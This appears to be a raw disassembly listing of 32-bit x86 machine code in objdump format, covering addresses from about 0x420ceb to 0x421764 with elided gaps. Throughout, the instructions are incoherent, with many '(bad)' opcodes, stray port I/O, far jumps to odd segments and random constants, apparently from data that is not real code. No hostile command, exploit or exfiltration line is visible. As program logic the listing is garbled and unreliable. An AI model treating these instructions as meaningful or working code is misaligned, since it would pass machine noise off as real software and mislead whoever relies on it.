  420ceb:	add    BYTE PTR [eax],al
  420ced:	add    BYTE PTR [ecx+0x51956c81],al
  420cf3:	inc    edi
  420cf4:	aad    0xb9
  420cf6:	cwde   
  420cf7:	stc    
  420cf8:	mov    ebp,0xe3e4f913
  420cfd:	sbb    eax,0x3e57d4b8
  420d02:	jmp    0xdd69:0x74d5ca5f
  420d09:	mov    ds:0x1c68ee07,al
  420d0e:	sub    ah,BYTE PTR [ebx+0x14]
  420d11:	mov    BYTE PTR cs:[eax-0x2218f03c],dh
  420d18:	ret    0x4553
  420d1b:	int3   
  420d1c:	mov    ebp,0xff268d7b
  420d21:	pop    esp
  420d22:	mov    bh,0xe3
  420d24:	aaa    
  420d25:	in     eax,0x56
  420d27:	cmp    BYTE PTR [eax],dl
  420d29:	fiadd  DWORD PTR [esi]
  420d2b:	jo     0x420ce7
  420d2d:	and    al,BYTE PTR [esi+0x1c]
  420d30:	mov    BYTE PTR [edx-0x14627757],ah
  420d36:	pop    ebp
  420d37:	in     eax,0x6a
  420d39:	leave  
  420d3a:	or     cl,BYTE PTR [ebp+0x5d8415f8]
  420d40:	fcom   DWORD PTR [esp+eax*1+0x7213d7b9]
  420d47:	ret    0xaf6f
  420d4a:	ja     0x420d9c
  420d4c:	inc    esi
  420d4d:	sub    al,ch
  420d4f:	in     eax,dx
  420d50:	pop    esp
  420d51:	ja     0x420d74
  420d53:	mov    cl,0xd3
  420d55:	sub    BYTE PTR [esi],dl
  420d57:	loop   0x420d8c
  420d59:	xchg   ecx,eax
  420d5a:	das    
  420d5b:	xchg   ebp,eax
  420d5c:	js     0x420d60
  420d5e:	popa   
  420d5f:	inc    edx
  420d60:	add    dl,BYTE PTR [edx+0x71]
  420d63:	push   ebp
  420d64:	aaa    
  420d65:	adc    bh,BYTE PTR [edx-0x7e331959]
  420d6b:	cmp    ebx,DWORD PTR [esp+eax*8]
  420d6e:	int3   
  420d6f:	and    BYTE PTR [eax+edx*1+0xd],ch
  420d73:	popa   
  420d74:	mov    eax,ds:0x2794b8ab
  420d79:	sub    dl,dl
  420d7b:	stc    
  420d7c:	popf   
  420d7d:	mov    dh,0x91
  420d7f:	ret    
  420d80:	and    di,dx
  420d83:	adc    eax,0xcfeb7db1
  420d88:	jmp    0x4954a0c7
  420d8d:	jns    0x420dee
  420d8f:	stos   DWORD PTR es:[edi],eax
  420d90:	sbb    DWORD PTR [edx+0x7e4f0ea3],ebx
  420d96:	daa    
  420d97:	push   0xffffffb9
  420d99:	adc    BYTE PTR [ecx+edi*8-0xdc88c95],bl
  420da0:	sbb    bl,BYTE PTR [eax+0x34]
  420da3:	fsub   QWORD PTR ds:[bp+0x28]
  420da8:	cmp    al,0xe5
  420daa:	jnp    0x420dac
  420dac:	mov    edi,0x8c49abe4
  420db1:	xor    dl,BYTE PTR [ebx]
  420db3:	cdq    
  420db4:	or     al,0x56
  420db6:	clc    
  420db7:	adc    bh,BYTE PTR [ebx+0x6b7e8b71]
  420dbd:	xor    DWORD PTR [eax],edx
  420dbf:	jnp    0x420dac
  420dc1:	pop    eax
  420dc2:	or     DWORD PTR [edx+ecx*4-0x2f010509],ebx
  420dc9:	jmp    0x4199:0xcee98d9c
  420dd0:	xchg   ebp,eax
  420dd1:	mov    ?,esp
  420dd3:	mov    ebx,0x8057b017
  420dd8:	inc    edi
  420dd9:	adc    BYTE PTR [edx-0x72],bl
  420ddc:	psubb  mm2,QWORD PTR [ebx+0x38dfc972]
  420de3:	fld    DWORD PTR [edi+ebp*8+0x2b]
  420de7:	iret   
  420de8:	leave  
  420de9:	jl     0x420e20
  420deb:	gs pop es
	...
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x9efdd79
  420e66:	frstor [eax+0x1]
  420e69:	add    bh,bh
  420e6b:	add    BYTE PTR [eax],al
  420e6d:	add    BYTE PTR [esi],bl
  420e6f:	arpl   WORD PTR [edi-0x3c],si
  420e72:	sbb    al,0xba
  420e74:	mov    ds:0xfe6c1869,eax
  420e79:	(bad)  [esi+0x4c39b3ad]
  420e7f:	xchg   edi,eax
  420e80:	ins    BYTE PTR es:[edi],dx
  420e81:	ins    BYTE PTR es:[edi],dx
  420e82:	out    dx,al
  420e83:	jecxz  0x420e1e
  420e85:	jne    0x420e5c
  420e87:	sbb    cl,BYTE PTR [edx+ebx*4]
  420e8a:	inc    ecx
  420e8b:	sub    BYTE PTR [esi+0x5c],0x95
  420e8f:	xor    DWORD PTR [ecx],edx
  420e91:	pop    esp
  420e92:	jecxz  0x420ea6
  420e94:	push   0x39
  420e96:	add    al,0x2
  420e98:	cmp    al,0x6f
  420e9a:	xchg   ebx,eax
  420e9b:	xor    dl,BYTE PTR [ecx-0x236a6ed9]
  420ea1:	scas   al,BYTE PTR es:[edi]
  420ea2:	push   eax
  420ea3:	sub    al,0x75
  420ea5:	mov    ecx,0xce3e239e
  420eaa:	add    BYTE PTR [eax+0x4],0xfe
  420eae:	loop   0x420e89
  420eb0:	sub    ebx,DWORD PTR [ebp+0x1388b7b5]
  420eb6:	mov    al,0xd4
  420eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb9:	jge    0x420f1d
  420ebb:	ds lahf 
  420ebd:	mov    DWORD PTR [ebx],esp
  420ebf:	fadd   QWORD PTR [esp+eiz*2-0x12]
  420ec3:	sub    ah,BYTE PTR [ecx-0x1f]
  420ec6:	mov    WORD PTR [eax],?
  420ec8:	push   esi
  420ec9:	(bad)  
  420ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ecc:	jmp    0x420f00
  420ece:	pop    ss
  420ecf:	sbb    esp,ecx
  420ed1:	dec    eax
  420ed2:	xchg   esp,eax
  420ed3:	cmp    bh,BYTE PTR [ecx]
  420ed5:	fld    TBYTE PTR [ecx-0x461fac32]
  420edb:	sbb    DWORD PTR [ebx+0x709e4116],ebp
  420ee1:	stos   BYTE PTR es:[edi],al
  420ee2:	stos   BYTE PTR es:[edi],al
  420ee3:	jno    0x420ec6
  420ee5:	out    dx,eax
  420ee6:	adc    BYTE PTR [esp+ebp*1-0x4ffcdab6],ah
  420eed:	inc    eax
  420eee:	ret    
  420eef:	cld    
  420ef0:	addr16 pop ss
  420ef2:	(bad)  
  420ef3:	mov    bh,0xa6
  420ef5:	ds xchg ebx,eax
  420ef7:	dec    edi
  420ef8:	sbb    esi,edx
  420efa:	div    BYTE PTR [ecx+0x7e]
  420efd:	test   ebp,ecx
  420eff:	xchg   edi,eax
  420f00:	in     eax,0x16
  420f02:	popa   
  420f03:	mov    ebx,0x27a39565
  420f08:	mov    ebx,0x6f59e181
  420f0d:	xlat   BYTE PTR ds:[ebx]
  420f0e:	mov    ds:0x74e86414,al
  420f13:	xchg   ebp,eax
  420f14:	aaa    
  420f15:	mov    ds:0xd46b7fb6,al
  420f1a:	push   ebx
  420f1b:	and    al,0x33
  420f1d:	scas   eax,DWORD PTR es:[edi]
  420f1e:	outs   dx,DWORD PTR ds:[esi]
  420f1f:	jge    0x420f59
  420f21:	push   es
  420f22:	xor    dl,0xef
  420f25:	adc    eax,0x9665fcee
  420f2a:	or     cl,dh
  420f2c:	push   cs
  420f2d:	adc    al,0x37
  420f2f:	push   ebx
  420f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f31:	cdq    
  420f32:	push   ss
  420f33:	mov    ds:0xaddb0d86,al
  420f38:	jecxz  0x420ed5
  420f3a:	jae    0x420f59
  420f3c:	sub    BYTE PTR [edi-0x64],cl
  420f3f:	pop    ss
  420f40:	shl    DWORD PTR [eax],1
  420f42:	lock rol DWORD PTR [ebx],0xfb
  420f46:	(bad)  
  420f47:	inc    DWORD PTR [edi+0x37]
  420f4a:	rol    DWORD PTR [ecx],0x84
  420f4d:	(bad)  
  420f4e:	ds inc eax
  420f50:	test   BYTE PTR [ebx],cl
  420f52:	das    
  420f53:	cwde   
  420f54:	mov    bl,0xab
  420f56:	xchg   ebx,eax
  420f57:	(bad)  
  420f58:	jbe    0x420f8e
  420f5a:	mov    edi,0xc428cca9
  420f5f:	pushf  
  420f60:	pop    DWORD PTR [edi-0x30]
  420f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f64:	stos   BYTE PTR es:[edi],al
  420f65:	in     eax,dx
  420f66:	in     al,0xc5
  420f68:	xor    DWORD PTR [bx],ecx
  420f6b:	shl    DWORD PTR [eax],cl
	...
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x3971f43c]
  420fe6:	fsub   QWORD PTR [ecx+0x1]
  420fe9:	add    bh,bh
  420feb:	add    BYTE PTR [eax],al
  420fed:	add    BYTE PTR [ebp+ecx*1-0x29],al
  420ff1:	mov    esp,0x856b1535
  420ff6:	adc    BYTE PTR [ebp-0xaa7410c],bl
  420ffc:	sbb    DWORD PTR [edx+ecx*1],edi
  420fff:	loop   0x421004
  421001:	mov    esp,0xd99331be
  421006:	rcl    DWORD PTR [eax+eax*4+0x56],0x54
  42100b:	add    edi,DWORD PTR [ebx+edx*2]
  42100e:	jmp    0xd4f747a3
  421013:	mov    DWORD PTR [ebx],0x3a23f981
  421019:	push   edi
  42101a:	lahf   
  42101b:	mov    DWORD PTR [ebx+ebx*2-0x5c],edi
  42101f:	ds pop ebp
  421021:	jmp    DWORD PTR [eax+0x1eac5e51]
  421027:	outs   dx,BYTE PTR ds:[esi]
  421028:	push   ss
  421029:	das    
  42102a:	xchg   esi,eax
  42102b:	pop    DWORD PTR [ebx+0x6a]
  42102e:	sbb    eax,0xe83237c1
  421033:	call   0xf835ede6
  421038:	lahf   
  421039:	adc    al,0x7
  42103b:	push   esp
  42103c:	xchg   BYTE PTR [edx+ebx*2],bh
  42103f:	je     0x4210bd
  421041:	and    DWORD PTR [ebx+eiz*4-0x4e],eax
  421045:	pushf  
  421046:	sbb    DWORD PTR [eax+0x17],esi
  421049:	stos   DWORD PTR es:[edi],eax
  42104a:	pop    ebp
  42104b:	xchg   BYTE PTR [eax+ebp*2],bl
  42104e:	push   ds
  42104f:	out    dx,al
  421050:	popa   
  421051:	(bad)  
  421052:	dec    ecx
  421053:	lds    eax,FWORD PTR [ebp+0x23591f5f]
  421059:	xchg   ebx,esp
  42105b:	inc    edx
  42105c:	jg     0x4210db
  42105e:	jle    0x42106b
  421060:	loopne 0x4210d4
  421062:	repnz stos DWORD PTR es:[edi],eax
  421064:	lods   al,BYTE PTR ds:[esi]
  421065:	(bad)  
  421066:	cdq    
  421067:	stc    
  421068:	and    BYTE PTR [edi+0x196f8877],0x75
  42106f:	sub    edi,DWORD PTR [ebx]
  421071:	mov    ah,0x60
  421073:	(bad)  
  421074:	mov    bl,0xbf
  421076:	dec    edi
  421077:	xor    al,0xa8
  421079:	enter  0x1fc6,0xab
  42107d:	xor    al,0x19
  42107f:	and    ebx,ecx
  421081:	sbb    DWORD PTR [esi-0x66],esi
  421084:	sbb    esi,DWORD PTR [eax+ebp*1-0x7afa31f]
  42108b:	sbb    al,0xbf
  42108d:	mov    ebp,0x7633b7d7
  421092:	sub    eax,0x10
  421095:	mov    eax,0x2b0e89b4
  42109a:	scas   al,BYTE PTR es:[edi]
  42109b:	and    eax,ebx
  42109d:	or     BYTE PTR [ebx-0x321effab],dl
  4210a3:	gs ret 0xeebf
  4210a7:	ja     0x421104
  4210a9:	cwde   
  4210aa:	pop    es
  4210ab:	and    DWORD PTR [ebx+0x3b029b91],ecx
  4210b1:	mov    ecx,0x45a7dade
  4210b6:	or     eax,0x6842d0b4
  4210bb:	pushf  
  4210bc:	rol    BYTE PTR [ebx-0x55],0xf7
  4210c0:	push   es
  4210c1:	sbb    eax,0xdb7707e2
  4210c6:	test   al,0xcb
  4210c8:	jle    0x421093
  4210ca:	adc    ecx,DWORD PTR [edx]
  4210cc:	jle    0x421093
  4210ce:	dec    ebp
  4210cf:	jge    0x421059
  4210d1:	stos   BYTE PTR es:[edi],al
  4210d2:	icebp  
  4210d3:	add    eax,0x41f64613
  4210d8:	jle    0x421075
  4210da:	les    esi,FWORD PTR [ebx-0x2f]
  4210dd:	aam    0x7f
  4210df:	call   0x726be3fd
  4210e4:	sar    DWORD PTR [ecx-0x114278e9],cl
  4210ea:	adc    al,0xdb
  4210ec:	lods   al,BYTE PTR ds:[esi]
	...
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    cs,eax
  421163:	sbb    ebp,DWORD PTR [ebx]
  421165:	icebp  
  421166:	(bad)  [edx+0x1]
  421169:	add    bh,bh
  42116b:	add    BYTE PTR [eax],al
  42116d:	add    cl,dh
  42116f:	push   eax
  421170:	test   al,0x23
  421172:	icebp  
  421173:	adc    dl,BYTE PTR [esi+0x7a]
  421176:	jg     0x4211f3
  421178:	sub    al,0x9e
  42117a:	mov    ebx,0x4ae95c1e
  42117f:	or     DWORD PTR [edi-0x4f807c8f],ecx
  421185:	shl    BYTE PTR [eax],1
  421187:	pushf  
  421188:	sub    dh,BYTE PTR [edx-0x53]
  42118b:	mov    ebx,0x379e1d78
  421190:	retf   
  421191:	or     al,0xf6
  421193:	in     al,dx
  421194:	enter  0x8c98,0x9a
  421198:	mov    cl,0xae
  42119a:	inc    BYTE PTR [ebp+ecx*1-0x7d]
  42119e:	rcr    DWORD PTR [esi-0x4f3109e7],1
  4211a4:	mov    eax,0x831fca11
  4211a9:	xchg   esp,eax
  4211aa:	push   edi
  4211ab:	sub    ah,0xd3
  4211ae:	in     eax,dx
  4211af:	js     0x4211f7
  4211b1:	lahf   
  4211b2:	xor    eax,0x823ed73c
  4211b7:	sub    DWORD PTR [edx-0x31eab24],esi
  4211bd:	xchg   esp,eax
  4211be:	and    eax,0xe1555c30
  4211c3:	adc    edx,DWORD PTR [ebx]
  4211c5:	push   ebp
  4211c6:	dec    edx
  4211c7:	in     eax,dx
  4211c8:	and    BYTE PTR [ebx-0x2340b526],al
  4211ce:	adc    bl,BYTE PTR [ecx]
  4211d0:	inc    esi
  4211d1:	mov    bl,0xb3
  4211d3:	lea    ebx,[edx-0x3826bbff]
  4211d9:	stos   DWORD PTR es:[edi],eax
  4211da:	shl    BYTE PTR [edi-0x66c9a0a9],cl
  4211e0:	daa    
  4211e1:	aad    0xa5
  4211e3:	ret    0x2bd5
  4211e6:	lods   eax,DWORD PTR ds:[esi]
  4211e7:	jb     0x4211d3
  4211e9:	test   al,0xd9
  4211eb:	sub    DWORD PTR [esi-0x63a06b40],0xf94bd783
  4211f5:	mov    eax,0x96cd71f6
  4211fa:	ror    BYTE PTR [eax],0x2b
  4211fd:	cmp    DWORD PTR [ecx+0x37],ecx
  421200:	mov    ecx,0x41d02864
  421205:	cli    
  421206:	sbb    esp,edi
  421208:	jle    0x4211db
  42120a:	sbb    al,0xd
  42120c:	test   DWORD PTR [edi-0x1c3241d4],ebx
  421212:	push   ss
  421213:	imul   esp,ebp,0xaf1040a7
  421219:	jl     0x4211f0
  42121b:	push   0xffffff83
  42121d:	test   eax,0x17d2c949
  421222:	adc    al,0x75
  421224:	add    esi,DWORD PTR [ebx]
  421226:	cli    
  421227:	and    ch,BYTE PTR [eax]
  421229:	push   edx
  42122a:	jg     0x421289
  42122c:	add    eax,0x354f81e3
  421231:	jo     0x42121e
  421233:	inc    esp
  421234:	scas   al,BYTE PTR es:[edi]
  421235:	ds or  al,0x4d
  421238:	sub    al,0x86
  42123a:	mov    dh,BYTE PTR [edx+0x46]
  42123d:	inc    ebp
  42123e:	xchg   esp,eax
  42123f:	sbb    esp,DWORD PTR [esp+ebx*2]
  421242:	and    dh,BYTE PTR [ebp-0x1a]
  421245:	mov    al,ds:0xc123eed4
  42124a:	push   esp
  42124b:	dec    edx
  42124c:	test   BYTE PTR [ebp-0x40a6912c],cl
  421252:	cmc    
  421253:	inc    edi
  421254:	adc    bl,BYTE PTR [edx+0x6a]
  421257:	mov    al,0xf
  421259:	in     eax,dx
  42125a:	cdq    
  42125b:	js     0x421218
  42125d:	and    al,0x9b
  42125f:	push   ds
  421260:	(bad)  
  421261:	pop    ds
  421262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421263:	sub    edx,0x8d5c475f
  421269:	sahf   
  42126a:	mov    dh,0x35
  42126c:	dec    edx
	...
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x4f9d7ab3
  4212e4:	lods   al,BYTE PTR ds:[esi]
  4212e5:	sbb    al,0xda
  4212e7:	arpl   WORD PTR [ecx],ax
  4212e9:	add    bh,bh
  4212eb:	add    BYTE PTR [eax],al
  4212ed:	add    BYTE PTR [edi-0x60af8226],dh
  4212f3:	pop    ds
  4212f4:	xchg   edx,eax
  4212f5:	jg     0x42134b
  4212f7:	xchg   ecx,eax
  4212f8:	and    ecx,DWORD PTR [edx+0x11b5b064]
  4212fe:	xchg   edx,eax
  4212ff:	sub    esp,DWORD PTR [ecx]
  421301:	ins    BYTE PTR es:[edi],dx
  421302:	jnp    0x4212c7
  421304:	and    ah,BYTE PTR [ecx-0x42]
  421307:	fld    st(6)
  421309:	popf   
  42130a:	scas   al,BYTE PTR es:[edi]
  42130b:	retf   0x5cab
  42130e:	pusha  
  42130f:	push   ecx
  421310:	inc    edi
  421311:	arpl   WORD PTR [eax],sp
  421313:	and    eax,0x65410a29
  421318:	jge    0x42137c
  42131a:	xchg   dl,bh
  42131c:	cmc    
  42131d:	mov    eax,0x7ff487d4
  421322:	fisttp WORD PTR [edi-0x2f]
  421325:	and    DWORD PTR [ebx],0xffffff9a
  421328:	xlat   BYTE PTR ds:[ebx]
  421329:	add    ebx,DWORD PTR [ebp-0x73]
  42132c:	sub    al,0x84
  42132e:	mov    eax,0xa2276ec2
  421333:	pushf  
  421334:	jmp    0x42a:0x41f5d360
  42133b:	fdiv   st(0),st
  42133d:	adc    ch,BYTE PTR [ebx-0x79]
  421340:	sub    DWORD PTR [ebp+eax*8-0x3f],0x4b
  421345:	shr    DWORD PTR [ebp+0x6dab297d],1
  42134b:	mov    ebx,0x8952bbf0
  421350:	test   DWORD PTR [ebx+0x11],edi
  421353:	sub    BYTE PTR [eax+ebx*1+0x6],bl
  421357:	mov    esp,0x615ce14e
  42135c:	iret   
  42135d:	xchg   edi,eax
  42135e:	hlt    
  42135f:	sbb    al,0xe9
  421361:	outs   dx,BYTE PTR ds:[esi]
  421362:	pusha  
  421363:	or     DWORD PTR [esi-0x7125e6d],ebp
  421369:	adc    al,0x7e
  42136b:	dec    esi
  42136c:	ret    
  42136d:	daa    
  42136e:	(bad)  
  42136f:	ja     0x421371
  421371:	addr16 jg 0x4213e6
  421374:	bound  eax,QWORD PTR [ecx]
  421376:	dec    esp
  421377:	cli    
  421378:	adc    eax,0xa8232c59
  42137d:	ins    DWORD PTR es:[edi],dx
  42137e:	mov    al,0x82
  421380:	sbb    BYTE PTR [esi-0x45],dl
  421383:	cmp    dl,al
  421385:	ret    0x1afe
  421388:	stos   BYTE PTR es:[edi],al
  421389:	repz adc DWORD PTR [esi],ebx
  42138c:	nop
  42138d:	cmp    esi,DWORD PTR [eax+edx*1+0x66]
  421391:	lock xor al,0x32
  421394:	adc    eax,0x5062e026
  421399:	aas    
  42139a:	loope  0x42133b
  42139c:	fsub   QWORD PTR [ebp+eax*4+0x6a]
  4213a0:	mov    ah,dh
  4213a2:	mov    ah,0xdc
  4213a4:	jnp    0x421422
  4213a6:	sub    DWORD PTR [esi],ebp
  4213a8:	pop    ecx
  4213a9:	scas   eax,DWORD PTR es:[edi]
  4213aa:	push   0x56
  4213ac:	jl     0x421400
  4213ae:	xchg   ebx,eax
  4213af:	push   edx
  4213b0:	pop    edx
  4213b1:	jae    0x4213a2
  4213b3:	xchg   ecx,eax
  4213b4:	enter  0x8d4d,0x83
  4213b8:	and    al,0xca
  4213ba:	(bad)  
  4213bc:	mov    dh,0x39
  4213be:	cmp    eax,0x2133300b
  4213c4:	pusha  
  4213c5:	jno    0x4213c6
  4213c7:	push   esp
  4213c8:	and    ebp,DWORD PTR [esi+0x50]
  4213cb:	popf   
  4213cc:	xor    dh,dh
  4213ce:	clc    
  4213cf:	xor    BYTE PTR [esp+ebp*1-0xf],dl
  4213d3:	fwait
  4213d4:	mov    ss:0xeb84ec87,al
  4213da:	mov    ebp,0xc70bbd69
  4213df:	cwde   
  4213e0:	or     dl,cl
  4213e2:	(bad)
  4213e5:	mov    DWORD PTR [ecx-0x2e7062bd],esp
  4213eb:	or     ch,ah
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x57a0f49f]
  421464:	aaa    
  421465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421466:	fldenv [ecx+eax*1+0x0]
  42146a:	inc    DWORD PTR [eax]
  42146c:	add    BYTE PTR [eax],al
  42146e:	sti    
  42146f:	ins    DWORD PTR es:[edi],dx
  421470:	(bad)  
  421471:	outs   dx,DWORD PTR ds:[esi]
  421472:	in     eax,dx
  421473:	(bad)  
  421474:	fnstcw WORD PTR [eax]
  421476:	cmc    
  421477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421478:	arpl   WORD PTR [ebx+ebx*8],bx
  42147b:	fild   DWORD PTR [ecx+0x14]
  42147e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42147f:	cmc    
  421480:	(bad)  
  421481:	stos   BYTE PTR es:[edi],al
  421482:	xrelease mov BYTE PTR [ebx-0x70b251df],ah
  421489:	into   
  42148a:	ins    BYTE PTR es:[edi],dx
  42148b:	fbld   TBYTE PTR [esi-0x1d654b3e]
  421491:	mov    edx,0x86564fbf
  421496:	lds    esp,FWORD PTR [esi-0x39453ee8]
  42149c:	or     ebx,eax
  42149e:	or     eax,ebp
  4214a0:	or     eax,ebx
  4214a2:	ror    BYTE PTR [edx+0x6b],cl
  4214a5:	lds    eax,FWORD PTR [edx-0x6e]
  4214a8:	ins    DWORD PTR es:[edi],dx
  4214a9:	push   edi
  4214aa:	popf   
  4214ab:	jne    0x42149b
  4214ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214ae:	loope  0x4214db
  4214b0:	xchg   DWORD PTR ds:0xcfc7aa3,esi
  4214b6:	dec    edi
  4214b7:	xor    BYTE PTR [esi],dh
  4214b9:	cli    
  4214ba:	out    0x6f,eax
  4214bc:	adc    al,BYTE PTR ds:[edi-0x12]
  4214c0:	retf   0x59ca
  4214c3:	imul   edx,DWORD PTR [edi+0x10453992],0x2f5e24ba
  4214cd:	fs js  0x4214a2
  4214d0:	sbb    al,0x8a
  4214d2:	jmp    0xaf5e7b7f
  4214d7:	test   BYTE PTR [edi],bh
  4214d9:	xchg   ebx,eax
  4214da:	xchg   esi,eax
  4214db:	dec    ecx
  4214dc:	add    BYTE PTR [ebx-0x45],cl
  4214df:	fisttp WORD PTR [edx-0x4]
  4214e2:	pop    ss
  4214e3:	out    dx,al
  4214e4:	mov    edi,0xd8a54746
  4214e9:	inc    edx
  4214ea:	and    eax,0xe3fa1ca9
  4214ef:	dec    edi
  4214f0:	sbb    eax,0x4a808474
  4214f5:	jge    0x4214a2
  4214f7:	dec    edi
  4214f8:	push   edi
  4214f9:	fdivp  st(5),st
  4214fb:	sahf   
  4214fc:	cdq    
  4214fd:	jnp    0x42156a
  4214ff:	sbb    eax,0x3eb25e86
  421504:	adc    cl,BYTE PTR [ecx]
  421506:	gs mov edx,0x89673400
  42150c:	cdq    
  42150d:	repnz cli 
  42150f:	inc    edx
  421510:	sbb    eax,0xfcfe3393
  421515:	sub    ebp,ebx
  421517:	push   esi
  421518:	ds xor edi,ebx
  42151b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42151c:	outs   dx,DWORD PTR ds:[esi]
  42151d:	dec    eax
  42151e:	mov    eax,ds:0x2c89cc84
  421523:	call   0x3339:0x2c4e18e1
  42152a:	and    ah,BYTE PTR ds:0xa421ab60
  421530:	(bad)  
  421531:	cmp    al,0x14
  421533:	adc    BYTE PTR [edi-0x49584784],dl
  421539:	fs es ss xchg esi,eax
  42153d:	(bad)  [ebp+eax*1+0x39c1adfc]
  421544:	int    0xd9
  421546:	mov    cl,0xfe
  421548:	ja     0x4214cd
  42154a:	call   0x48b0:0xbc77acd9
  421551:	cmc    
  421552:	jb     0x4214e7
  421554:	or     cl,BYTE PTR [esi+0xd]
  421557:	stos   BYTE PTR es:[edi],al
  421558:	in     al,dx
  421559:	sub    BYTE PTR [ecx+ebp*2],bl
  42155c:	cwde   
  42155d:	bound  eax,QWORD PTR [ecx+0x3b]
  421560:	fadd   DWORD PTR [edx+0xa]
  421563:	adc    ah,BYTE PTR [ebp+0x55]
  421566:	out    dx,eax
  421567:	cdq    
  421568:	and    ecx,DWORD PTR [esi+0x6d]
  42156b:	mov    edx,0xdb
	...
  4215d4:	add    BYTE PTR [eax],al
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x249042b4],bp
  4215e4:	or     cl,dh
  4215e6:	fsub   DWORD PTR [ebp+0x1]
  4215e9:	add    bh,bh
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [ecx+0x73ec9615],al
  4215f3:	jmp    0x421609
  4215f5:	pop    ecx
  4215f6:	fnstcw WORD PTR cs:[ebp-0xa86170a]
  4215fd:	mov    edi,0xf9013b06
  421602:	add    ch,BYTE PTR [eax+ebp*2-0x57e477d5]
  421609:	mov    edi,0x5cb920d6
  42160e:	sub    eax,0xf5998ce4
  421613:	(bad)  
  421614:	mov    ebp,0xa4c2ed6c
  421619:	not    DWORD PTR [esi+0x2d42fde8]
  42161f:	dec    esi
  421620:	add    eax,0x79084ed5
  421625:	retf   0x4525
  421628:	push   eax
  421629:	jb     0x4216a9
  42162b:	fbld   TBYTE PTR [edi-0x6526cd4b]
  421631:	addr16 retf 0x560
  421635:	in     al,dx
  421636:	inc    esp
  421637:	mov    ebp,0xbbf7e68e
  42163c:	in     al,0x5c
  42163e:	or     DWORD PTR [eax],edx
  421640:	(bad)  
  421641:	jge    0x4215e8
  421643:	mov    ecx,DWORD PTR [edx+0x42]
  421646:	sahf   
  421647:	xchg   edx,eax
  421648:	or     BYTE PTR [edx+0x6411bf51],ch
  42164e:	sbb    DWORD PTR [esi],ecx
  421650:	adc    ch,BYTE PTR ds:0x1ba1c2da
  421656:	dec    esi
  421657:	pushf  
  421658:	or     BYTE PTR [ecx],al
  42165a:	fucomp st(0)
  42165c:	xchg   esi,eax
  42165d:	out    0xd9,al
  42165f:	xchg   dh,dh
  421661:	xchg   esp,eax
  421662:	or     eax,0xfe47d3f1
  421667:	mov    ah,0x5
  421669:	aad    0x32
  42166b:	xchg   BYTE PTR [eax+0x2a],dl
  42166e:	(bad)  
  421670:	add    eax,0x9bb32a4
  421675:	add    al,0x40
  421677:	pop    esp
  421678:	adc    edx,DWORD PTR [ebx]
  42167a:	aam    0x55
  42167c:	shl    BYTE PTR [edi],0xc2
  42167f:	(bad)  
  421680:	fsub   DWORD PTR [ecx+0x69824fc6]
  421686:	add    al,0xbd
  421688:	cwde   
  421689:	leave  
  42168a:	fldcw  WORD PTR [ecx]
  42168c:	not    DWORD PTR [edx-0x6c655e7c]
  421692:	lock or ecx,edi
  421695:	cdq    
  421696:	retf   0x783f
  421699:	xlat   BYTE PTR ds:[ebx]
  42169a:	mov    al,ds:0xd3cc4393
  42169f:	ins    BYTE PTR es:[edi],dx
  4216a0:	es in  al,0x62
  4216a3:	inc    eax
  4216a4:	ret    0x9ffa
  4216a7:	push   0xfffffff7
  4216a9:	jbe    0x421679
  4216ab:	cmp    esp,0xffffff8f
  4216ae:	push   edx
  4216af:	int3   
  4216b0:	dec    DWORD PTR [edx+0x7e]
  4216b3:	dec    eax
  4216b4:	rol    BYTE PTR [esi+0x64fde448],cl
  4216ba:	mov    esp,0x89cae04d
  4216bf:	std    
  4216c0:	push   ebp
  4216c1:	sub    dh,BYTE PTR [esi+0x29]
  4216c4:	cmp    eax,0x1aec9d54
  4216c9:	sbb    al,0x4f
  4216cb:	xor    cl,BYTE PTR [edx-0x6f]
  4216ce:	scas   al,BYTE PTR es:[edi]
  4216cf:	dec    esi
  4216d0:	fdivr  st(2),st
  4216d2:	aaa    
  4216d3:	retf   
  4216d4:	test   DWORD PTR [edx],ebp
  4216d6:	xor    ebp,ecx
  4216d8:	outs   dx,DWORD PTR ds:[esi]
  4216d9:	test   bl,ah
  4216db:	or     ecx,DWORD PTR [edi+0xd]
  4216de:	scas   al,BYTE PTR es:[edi]
  4216df:	cwde   
  4216e0:	jae    0x4216d4
  4216e2:	enter  0x6abe,0x59
  4216e6:	sahf   
  4216e7:	dec    esp
  4216e8:	mov    esi,0x7ad793c9
	...
  421755:	add    BYTE PTR [ebx-0x105512d4],ch
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	xchg   edi,eax
  421763:	push   edi
  421764:	outs   dx,DWORD PTR ds:[esi]
